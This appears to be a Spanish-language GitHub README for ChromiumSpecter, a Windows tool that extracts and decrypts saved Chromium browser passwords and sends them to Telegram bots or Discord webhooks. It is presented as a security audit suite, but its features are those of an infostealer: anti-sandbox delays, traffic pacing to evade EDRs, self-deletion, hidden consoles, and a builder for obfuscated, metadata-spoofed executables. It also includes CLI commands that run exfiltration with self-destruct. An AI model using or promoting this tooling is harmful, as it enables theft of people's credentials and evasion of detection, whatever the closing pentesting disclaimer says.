# 🛡️ ChromiumSpecter Auditor Suite

> [!NOTE]
> [English Version](README.en.md) | **Versión en Español**

<div align="center">

![Windows](https://img.shields.io/badge/Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)
![Python](https://img.shields.io/badge/Python-3776AB?style=for-the-badge&logo=python&logoColor=white)
![SQLite](https://img.shields.io/badge/SQLite-07405E?style=for-the-badge&logo=sqlite&logoColor=white)
![Telegram](https://img.shields.io/badge/Telegram-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white)
![Discord](https://img.shields.io/badge/Discord-5865F2?style=for-the-badge&logo=discord&logoColor=white)

*La suite definitiva de grado táctico para auditorías de seguridad en navegadores Chromium.*

[Reportar Bug](https://github.com/ANONIMO432HZ/ChromiumSpecter/issues) | [Solicitar Mejora](https://github.com/ANONIMO432HZ/ChromiumSpecter/issues)

</div>

---

<div align="center">
  <img src="screenshots/dashboard.png" width="800" alt="ChromiumSpecter Dashboard">
</div>

---

## 💻 Resumen de Capacidades

**ChromiumSpecter** es una suite de auditoría de credenciales diseñada para entornos Windows, enfocada en la discreción, la automatización y la ergonomía operativa. Permite extraer, descifrar y exfiltrar datos de navegadores basados en Chromium (v80+) con una arquitectura modular y resiliente.

### 🌟 Características Destacadas

* **🖥️ Dashboard de Alta Densidad**: Interfaz gráfica profesional con consolas en tiempo real, estadísticas dinámicas y gestión de resultados.
* **🔐 Motor de Descifrado Dual**:
  * Soporte simultáneo para **AES-GCM (Chromium v80+)** y **DPAPI Legacy** en la misma base de datos de perfiles.
  * Descifrado por blob individual — un perfil migrado puede tener entradas de ambos tipos y se procesan correctamente sin descartar nada.
  * Detección automática del esquema por prefijo (`v10`/`v11`) con fallback inteligente a DPAPI si AES falla.
  * Perfiles sin llave AES (Chrome antiguo) siguen procesándose en modo DPAPI puro.
* **🕵️ Motor de Sigilo (Tactical Stealth)**:
  * **Startup Delay**: Selector de retraso inicial (0-300s) para evadir análisis en Sandboxes.
  * **Inter-file Delay (`send_delay`)**: Pausas personalizables entre envíos para prevenir picos de tráfico que alerten a firewalls o EDRs.
  * **Anti-Forensics**: Soporte para **Autodestrucción Táctica** (Auto-Delete) del binario tras la ejecución.
  * **Protocolo de Pánico**: Saneamiento total del entorno de auditoría con un solo clic.
* **🧠 Detección Inteligente de Perfiles**:
  * Escaneo diferenciado: Chrome/Edge/Brave usan subdirectorios (`Default`, `Profile N`); Opera/Vivaldi usan la raíz directamente.
  * Validación de tamaño de archivo antes de procesar (evita falsos positivos con BD vacías).
  * Manejo de `PermissionError` por perfil sin abortar el escaneo completo.

<div align="center">
  <img src="screenshots/exit_self-destroy.png" width="600" alt="ChromiumSpecter Panic Exit">
</div>

### 🚀 Exfiltración Inteligente

* **Auto-Exfiltración**: Configuración para envío automático inmediato tras la auditoría.
* **Multi-Canal**: Soporte nativo para **Telegram Bots** y **Discord Webhooks** con redundancia.
* **Persistencia Local**: Guardado seguro de configuraciones de exfiltración para uso recurrente.

### 🛠️ Builder Visual Integrado

Generación de stubs personalizados con **Inyección Dinámica** de parámetros.
**Spoofing de Metadatos**: Presets integrados para clonar firmas.
**Compresión y Ofuscación**: Soporte nativo para UPX y PyArmor.

<div align="center">
  <img src="screenshots/builder.png" width="800" alt="ChromiumSpecter Builder">
</div>

---

## 🚀 Flujo de Trabajo Táctico

1. **Configuración**: Define tus tokens de Telegram/Discord en el Tab de **Exfiltración** y guárdalos.
2. **Auditoría**: Lanza el escaneo desde el Dashboard. Puedes activar la **Auto-exfiltración** y **Autodestrucción** para un ciclo de "ejecución y olvido".
3. **Inspección**: Visualiza las credenciales descifradas en tiempo real en el Tab de **Resultados**.
4. **Despliegue**: Usa el **Builder** para generar un `.exe` con tus credenciales embebidas (Base64) y presets de sigilo configurados.

## 🖥️ Uso Avanzado (CLI)

El motor principal (`main.py`) puede ejecutarse de forma independiente sin la interfaz gráfica, ideal para automatizaciones o despliegues rápidos via terminal.

```bash
# Auditoría básica
python main.py

# Auditoría con exfiltración automática a Discord
python main.py --webhook "https://discord.com/api/webhooks/..." --self-destruct

# Auditoría silenciosa (sin consola) y guardado en carpeta personalizada
python main.py --stealth --output-dir "C:\temp\logs"
```

### Parámetros Disponibles (CLI)

| Grupo | Parámetro | Descripción |
| :--- | :--- | :--- |
| **Exfiltración** | `--webhook` | Discord Webhook URL para envío de reportes. |
| | `--tg-token` | Token del bot de Telegram. |
| | `--tg-chat-id` | ID del chat o canal de Telegram. |
| | `--no-exfil` | Desactiva el envío externo de datos. |
| **Reportes** | `--no-html` | No genera el reporte visual en HTML. |
| | `--no-csv` | No genera el reporte estructurado en CSV. |
| | `--json` | Genera un reporte adicional en formato JSON. |
| | `--output-dir` | Carpeta de salida (default: `.audit`). |
| **Motor** | `--browser` | Filtra por un navegador específico (chrome, brave, etc). |
| | `--delay` | Retraso inicial (segundos) antes de actuar. |
| | `--stealth` | **Modo Stealth**: Oculta la ventana de consola inmediatamente al arrancar (vía API de Windows). |
| | `--auto-kill` | Cierra navegadores automáticamente si la base de datos está bloqueada. |
| | `--self-destruct` | **Elimina el ejecutable** tras finalizar el ciclo. |
| | `--no-wipe` | No borra los reportes locales tras enviarlos. |
| | `--clean` | Limpia todos los reportes antiguos en la carpeta de salida. |
| | `--debug` | Muestra logs detallados de depuración. |

---

## ⚙️ Parámetros de Compilación (Stub)

Al usar el **Builder**, puedes inyectar los siguientes comportamientos en tu binario final. Las opciones marcadas con 📡 solo están disponibles cuando el archivo fuente es `main.py` o una copia del mismo.

| Parámetro | Rango / Opción | Propósito |
| :--- | :--- | :--- |
| **Delay Inicial** | 0s - 3600s | Retraso antes de la primera acción (Anti-Sandbox). |
| **Send Delay** | 0s - 60s | Pausa entre archivos enviados (Evasion de tráfico). |
| **Webhook Timeout** | 1s - 300s | Tiempo de espera para conexiones inestables. |
| **📡 Auto-Exfiltrar** | Checkbox | Activa el envío automático sin intervención al ejecutar. |
| **📡 Modo Stealth** | Runtime Flag | Oculta la consola al arrancar (vía `ShowWindow` Win32 API). |
| **💥 Autodestrucción** | Checkbox | Elimina el `.exe` tras finalizar el ciclo. |
| **UAC Prompt** | Toggle | Solicita privilegios de administrador si es necesario. |
| **Ofuscar con PyArmor** | Toggle | Aplica ofuscación al código fuente antes de compilar. |
| **Compresión UPX** | Toggle | Comprime el binario final (reduce tamaño ~30-50%). |
| **Mostrar Consola** | Compiler Flag | Genera un `Console App`. Si está desmarcado, genera un `Windowed App` invisible. |

> [!TIP]
> **Diferencia Técnica — Mostrar Consola vs Modo Stealth**:
> - **Mostrar Consola** (Compilador): Determina si el **Sistema Operativo** crea la ventana desde cero. Desmarcado = `Windowed App`, nunca hay ventana negra.
> - **Modo Stealth** (Runtime): La ventana sí se crea, pero el código la oculta en milisegundos con `ShowWindow(0)`. Puede verse un destello breve.
> - **Recomendación**: Dejá "Mostrar Consola" **desmarcado** + "Modo Stealth" **marcado** para doble capa de sigilo.


---

## 🛠️ Stack Tecnológico

| Componente | Tecnología |
| :--- | :--- |
| **Core UI** | `CustomTkinter` (Modern Dark Theme) |
| **Criptografía** | `AES-GCM 256` via `PyCryptodomex` + `Windows DPAPI` |
| **Seguridad OS** | `Win32 API` (`CryptUnprotectData`, `ShowWindow`) |
| **Compilación** | `PyInstaller` + `PyArmor` + `UPX` |
| **Persistencia** | `JSON` Local (`.audit/exfil_config.json`) |
| **Testing** | `pytest` + `pytest-mock` (18 tests, 0 fallos) |

---

## ⚙️ Guía de Instalación

```bash
# 1. Clonar el repositorio
git clone https://github.com/ANONIMO432HZ/ChromiumSpecter
cd ChromiumSpecter

# 2. Instalar dependencias
pip install -r requirements.txt

# 3. Lanzar el Dashboard
python gui_app.py
```

---

## 📡 Configuración de Exfiltración

### 🤖 Telegram

Requiere **Token** y **Chat ID**.

* Obtén el token con `@BotFather`.
* Obtén tu ID con `@userinfobot`.

### 🎮 Discord

Requiere **Webhook URL**.

* Configúralo en: Ajustes del Canal -> Integraciones -> Webhooks.

---

## 🧪 Calidad y Testing

La suite incluye una batería de pruebas automatizadas para garantizar la integridad de los algoritmos de descifrado y los canales de exfiltración.

Para ejecutar los tests, asegúrate de tener activado el entorno virtual y corre:

```bash
# Ejecutar todos los tests
pytest

# Ejecutar con reporte detallado
pytest -v
```

> [!TIP]
> Los tests utilizan `pytest-mock` para simular llamadas de red y acceso a archivos del sistema, lo que permite validaciones seguras sin riesgo de exfiltración real durante las pruebas.

---

## ⚖️ Aviso Legal y Ético

> [!CAUTION]
> **ESTE SOFTWARE ES PARA FINES DE PENTESTING ÉTICO Y AUDITORÍA PROFESIONAL.**
> El uso de esta herramienta para acceder a sistemas sin la autorización explícita del propietario es ilegal. El autor no asume responsabilidad por el mal uso de esta suite.

---
